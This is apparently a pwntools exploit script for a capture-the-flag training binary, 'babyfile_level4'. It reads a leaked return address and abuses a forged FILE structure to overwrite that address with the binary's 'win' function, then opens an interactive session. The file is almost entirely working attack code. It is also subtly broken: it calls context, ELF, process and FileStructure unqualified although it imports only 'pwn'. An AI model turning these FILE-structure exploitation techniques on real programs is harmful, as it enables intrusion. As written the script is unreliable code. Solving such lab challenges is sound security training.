#Nagib Lakhdari 3si2
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# This exploit was generated via
# 1) pwntools
# 2) ctfmate

import pwn

BINARY = "/challenge/babyfile_level4"
LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
LD = "/lib64/ld-linux-x86-64.so.2"

exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8 = pwn.p8
u8 = pwn.u8

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB: 
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else: 
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(pwn.args.HOST or '127.0.0.1', int(pwn.args.PORT or 1337))
    if pwn.args.GDB: 
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL: 
        return local(argv, *a, **kw)
    else: 
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# Exploit function
def exploit():
    #--------Setup--------#
    context(arch="amd64", os="linux")
    elf = ELF("/challenge/babyfile_level4", checksec=False)

    # Start the process for the challenge binary
    p = process("/challenge/babyfile_level4")

    # Receive the output until the specific string is found
    p.recvuntil(b"stored at: ")

    # Extract the return address from the received output
    ret_addr = int(p.recvuntil(b'\n')[-15:-1], 16)

    # Create a file structure payload to read from the return address
    fs = FileStructure()
    payload = fs.read(ret_addr, 1000)

    # Send the payload to the process
    p.send(payload)

    # Send the payload to overwrite the return address with the address of the 'win' function
    p.send(p64(elf.sym['win']) + b"\x00" * (1000 - 8))

    # Interact with the process to get the output
    p.interactive()
    pass

if __name__ == "__main__":
    exploit()
